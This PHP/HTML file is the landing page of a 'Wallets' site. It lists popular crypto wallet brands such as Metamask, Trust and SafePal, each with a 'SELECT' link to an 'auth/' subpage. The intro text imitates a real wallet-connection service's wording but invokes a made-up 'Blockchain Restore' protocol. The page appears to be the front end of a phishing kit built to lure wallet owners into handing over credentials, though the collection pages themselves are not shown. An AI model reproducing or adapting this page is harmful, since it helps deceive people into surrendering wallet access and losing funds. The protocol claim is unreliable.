<?php
// Date in the past
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");

ini_set('session.gc_maxlifetime', 86400);
session_start();

require_once("includes/functions.php");

require_once("includes/mobile-detect.php");
$detect = new Mobile_Detect;
?>
<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<base href="<?php directory(); ?>" target="_top">

<meta name="robots" content="index, follow" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="keywords" content="Wallets, <?php echo $full_gen_name; ?>, Coins">
<meta name="author" content="<?php echo $gen_name; ?>">
<meta name="description" content="Wallets - <?php echo $full_gen_name; ?>"/>
<link rel="canonical" href="<?php echo $actual_link; ?>"/>
<link rel="alternate" href="<?php echo $domain; ?>" hreflang="en-ng"/>

<link rel="shortcut icon" href="<?php echo new_version("{$images}favicon.png"); ?>">
<link rel="apple-touch-icon" sizes="120x120" href="<?php echo new_version("{$images}favicon.png"); ?>">
<link rel="apple-touch-icon" sizes="152x152" href="<?php echo new_version("{$images}favicon.png"); ?>">
<title>Wallets - <?php echo $full_gen_name; ?></title>
  
<!-- Favicons-->
<link rel="shortcut icon" href="<?php echo new_version("{$images}favicon.png"); ?>">
<!-- Favicons-->
<link rel="apple-touch-icon-precomposed" href="<?php echo new_version("{$images}favicon.png"); ?>">
<!-- For iPhone -->
<meta name="msapplication-TileColor" content="#b20">
<meta name="msapplication-TileBackground" content="#000">
<meta name="msapplication-TileImage" content="<?php echo new_version("{$images}favicon.png"); ?>">
<!-- For Windows Phone -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
<meta name="apple-mobile-web-app-capable" content="yes">

<meta property="og:url" content="<?php directory(); ?>" /> 
<meta property="og:type" content="article" />
<meta property="og:title" content="Wallets - <?php echo $full_gen_name; ?>" /> 
<meta property="og:description" content="Wallets - <?php echo $full_gen_name; ?>" />  
<meta property="og:image" content="<?php directory(); echo new_version("{$images}logos/yomijojolo-logo.png"); ?>" />
<meta property="og:image:type" content="image/png" />
<meta property="og:image:width" content="140" />
<meta property="og:image:height" content="140" />

<link type="text/css" rel="stylesheet" href="css/bootstrap.css" />
<link type="text/css" rel="stylesheet" href="css/font-awesome.css" />
<link type="text/css" rel="stylesheet" href="<?php echo new_version("css/style.css"); ?>" />
<style>
<!--
.selection-grid{
padding:10px;
}
.selection-grids *{
text-align:center;
}
.selection-grids h1{
margin-top:20px;
margin-bottom:20px;
}
.selection-grids h1, .selection-grids h1 *{
text-transform:uppercase;
}
.section-item{
background:#fcfcfc;
border:1px solid #eee;
padding:10px;
}
.section-item:hover{
background:#eee;
border:1px solid #c66;
}
.section-item img{
height:100px;
}
.selection-grid p{
font-weight:900;
font-size:20px;
color:#060;
}
-->
</style>
</head>

<body>

<?php
$option = tr_input("option");
?>

<?php //require_once("includes/upper.php"); ?>

<div class="home-body-wrapper selection-grids"> 
<div class="home-body row"> 
<h1 class="body-header align-center"><?php echo ucfirst($option); ?> <span>Wallets</span></h1>
<p>Multiple iOS and Android ./wallets support the <b>Blockchain Restore</b> protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>

<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/wallets/blockchain.png">
<p>Blockchain</p>
<div><a href="auth/Blockchain/" class="btn gen-btn border-radius">SELECT</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/wallets/metamask.png">
<p>Metamask</p>
<div><a href="auth/Metamask/" class="btn gen-btn border-radius">SELECT</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/wallets/trust.png">
<p>Trust</p>
<div><a href="auth/Trust/" class="btn gen-btn border-radius">SELECT</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/wallets/rainbow.png">
<p>Rainbow</p>
<div><a href="auth/Rainbow/" class="btn gen-btn border-radius">SELECT</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/wallets/imtoken.png">
<p>imToken</p>
<div><a href="auth/imToken/" class="btn gen-btn border-radius">SELECT</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/wallets/authereum.png">
<p>Authereum</p>
<div><a href="auth/Authereum/" class="btn gen-btn border-radius">SELECT</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/wallets/safepal.png">
<p>SafePal</p>
<div><a href="auth/SafePal/" class="btn gen-btn border-radius">SELECT</a></div>
</div>
</div>

</div>
</div>

<?php require_once("includes/footer.php"); ?>